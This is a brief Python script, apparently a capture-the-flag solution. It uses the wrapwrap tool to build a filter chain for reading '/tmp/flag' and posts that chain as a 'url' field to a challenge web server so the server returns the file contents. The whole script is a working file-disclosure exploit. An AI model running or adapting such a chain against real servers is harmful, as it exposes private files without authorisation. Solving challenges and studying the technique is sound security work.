import subprocess
import requests

def execute_command(command):
    try:
        result = subprocess.run(command, shell=True, check=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
        return result.stdout
    except subprocess.CalledProcessError as e:
        print(f"Error executing command: {e}")
        return None

def main():
    # Execute the command to write data into chain.txt
    command = "python3 wrapwrap.py /tmp/flag '{\"message\":\"\' \'\"}' 100"
    execute_command(command)

    # Read the content of chain.txt
    with open("chain.txt", "r") as file:
        url = file.read().strip()

    # Make a POST request with the content of the URL
    payload = {'url': url}
    response = requests.post('https://flowersv2.events-spark.tech/', data=payload)

    # Show the result
    print("Response:", response.text)

if __name__ == "__main__":
    main()
